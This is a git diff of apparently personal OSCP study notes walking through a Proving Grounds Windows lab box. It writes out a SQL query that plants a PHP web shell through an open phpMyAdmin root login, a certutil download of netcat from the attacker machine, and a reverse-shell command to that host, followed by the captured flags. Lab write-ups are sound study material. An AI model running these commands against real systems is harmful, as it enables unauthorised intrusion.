@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-22
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Windows
 Difficulty: Easy
@@ -73,34 +74,34 @@ No enumeration conducted
 No enumeration conducted
 ## Port 3128 - HTTP (Squid http proxy 4.14)
 - Navigated to `http://192.168.146.189:3128` and identified `Squid/4.14`
-![[Pasted image 20241022183533.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022183533.png]]
 - Downloded `spose.py` Squid Pivoting Open Port Scanner) and ran `python3 spose.py --proxy http://192.168.146.189:3128 --target 192.168.146.189` to identify open ports `3306` and `8080` behind proxy
-![[Pasted image 20241022184332.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022184332.png]]
 - Setup FoxyProxy with hostname `192.168.146.189` and port `3128`
-![[Pasted image 20241022184554.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022184554.png]]
 - Navigated to `http://192.168.146.189:8080` via proxy `3128` and identified `Wampserver v3.2.3` and aliases
-![[Pasted image 20241022184838.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022184838.png]]
 - Followed link `phpinfo()`, navigated to `http://192.168.146.189:8080/?phpinfo=-1` and identified `PHP v7.3.21`
-![[Pasted image 20241022185105.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022185105.png]]
 - Identified `Document_Root` in directory `C:/wamp/www`
-![[Pasted image 20241022185425.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022185425.png]]
 - Navigated to `http://192.168.146.189:8080/phpmyadmin/` and identified `phpMyAdmin` login page
-![[Pasted image 20241022185530.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022185530.png]]
 - Attempted password guessing with `root:` (No Password) and gained admin access
-![[Pasted image 20241022185627.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022185627.png]]
 ---
 # Exploitation
 Selected "SQL" tab, navigated to `http://192.168.146.189:8080/phpmyadmin/db_sql.php?db=mysql` , and successfully ran SQL query 
 ```
 `select '<?php system($_GET["cmd"]); ?>;' into outfile 'C:/wamp/www/revshell.php'
 ```
-![[Pasted image 20241022190415.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022190415.png]]
 - Navigated to `http://192.168.146.189:8080/revshell.php?cmd=dir` and confirmed code execution
-![[Pasted image 20241022190949.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022190949.png]]
 - Uploaded `nc2.exe` from Kali host to target via `certutil` by navigating to `http://192.168.146.189:8080/revshell.php?cmd=certutil%20-urlcache%20-f%20http://192.168.45.209:80/nc2.exe%20nc2.exe`
-![[Pasted image 20241022191602.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022191602.png]]
 - Setup netcat listener on port `1234` and created reverse shell by navigating to `http://192.168.146.189:8080/revshell.php?cmd=nc2.exe%20192.168.45.209%201234%20-e%20cmd.exe` 
-![[Pasted image 20241022193428.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241022193428.png]]
 - Navigated to `C:\` and ran `type C:\local.txt` to print `e1e484bbc0c7fbccaf088074d318848d`
 - Navigated to `C:\Users\Administrator\Desktop` and ran `type C:\Users\Administrator\Desktop\proof.txt` to print `f1d847afd8a8cee6ca94ad3008ce4ec9`
 ---
